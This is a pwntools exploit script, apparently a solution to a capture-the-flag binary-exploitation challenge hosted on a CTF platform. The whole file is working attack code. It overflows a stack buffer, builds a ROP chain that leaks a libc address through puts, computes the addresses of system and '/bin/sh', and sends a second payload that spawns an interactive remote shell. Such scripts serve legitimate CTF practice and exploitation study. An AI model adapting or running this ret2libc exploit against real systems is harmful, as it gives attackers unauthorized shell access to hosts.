from pwn import *


def get_addr():
    return u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))

# io = remote("192.168.170.128", 1234)
# context.arch = "amd64"

# io = remote("node4.buuoj.cn", 28576)
io = remote("node5.anna.nssctf.cn", 28290)


def s(a):
    io.send(a)


def sa(a, b):
    io.sendafter(a, b)


def sl(a):
    io.sendline(a)


def sal(a, b):
    io.sendlineafter(a, b)


def r():
    print(io.recv())


def ru(a):
    io.recvuntil(a)

def rl():
    io.recvline()

elf = ELF('./PWN2')

gets_plt =  0x400740
gets_got =  0x602050
puts_plt =  0x4006e0
puts_got =  0x602020
setvbuf_plt =  0x400760
setvbuf_got =  0x602060

context(os='linux', arch = 'amd64', log_level = "debug")

pop_rdi = 0x0000000000400c83
ret = 0x00000000004006b9
main = 0x0400B28

payload1 = (b'\x00' + b'a' * (0x50 + 7) +
            p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main))

ru("Input your choice!")
sl('1')

ru("Input your Plaintext to be encrypted")
sl(payload1)

libc_base = get_addr() - 0x809c0
print("libc_base =", hex(libc_base))

sys_padding = 0x4f440
bin_sh_padding = 0x1b3e9a
sys_addr = sys_padding + libc_base
bin_sh_addr = bin_sh_padding + libc_base

ru("Input your choice!")
sl('1')
payload2 = b'\x00' + b'a' * (0x50 + 7) + p64(ret) + p64(pop_rdi) + p64(bin_sh_addr) + p64(sys_addr)

sl(payload2)

io.interactive()


